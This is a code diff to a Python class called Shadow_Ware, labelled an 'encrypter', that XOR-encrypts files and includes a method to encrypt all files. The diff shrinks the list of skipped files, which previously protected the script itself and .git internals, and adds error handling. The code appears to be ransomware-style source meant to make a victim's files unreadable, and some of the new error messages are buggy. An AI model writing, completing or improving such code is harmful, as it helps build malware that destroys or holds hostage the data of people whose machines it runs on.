@@ -5,12 +5,7 @@ import base64, random, os, hashlib, hmac, string
 """ Class for encrypter """
 class Shadow_Ware():
   def __init__(self):
-    self.ignored_files = [
-      "ID.id",
-      "encrypter.py",
-      ".git",
-      'hooks', 'refs', 'info', 'lfs', 'logs', 'objects', 'branches', 'remotes', 'heads', 'tags', 'origin', 'tmp', 'refs', 'remotes', 'heads', 'origin', 'pack', 'info'  
-    ]
+    self.ignored_files = ["Copyright Preston E.md"]
 
     # Keys and ID
     self.key = self.get_key()
@@ -61,15 +56,24 @@ class Shadow_Ware():
 
   # Encryption code
   def encrypt_file(self, input_file, output_file):
-    with open(input_file, "rb") as file:
-        data = file.read()
+    try:
+      with open(input_file, "rb") as file:
+          data = file.read()
+    except Exception as e:
+      print("Failed to read " + input_file + " because " + e)
 
-    encrypted_data = bytearray(len(data))
-    for i in range(len(data)):
-        encrypted_data[i] = data[i] ^ self.bytes_key[i % len(self.bytes_key)]
+    try:
+      encrypted_data = bytearray(len(data))
+      for i in range(len(data)):
+          encrypted_data[i] = data[i] ^ self.bytes_key[i % len(self.bytes_key)]
+    except Exception as e:
+      print("Failed to encrypt data of " + input_file + " because " + e)
 
-    with open(output_file, "wb") as file:
-        file.write(encrypted_data)
+    try:
+      with open(output_file, "wb") as file:
+          file.write(encrypted_data)
+    except Exception as e:
+      print("Failed to write encrypted data to " + output_file + " because " + e)
 
   # Encrypt All Files
   def encrypt_all_files(self):
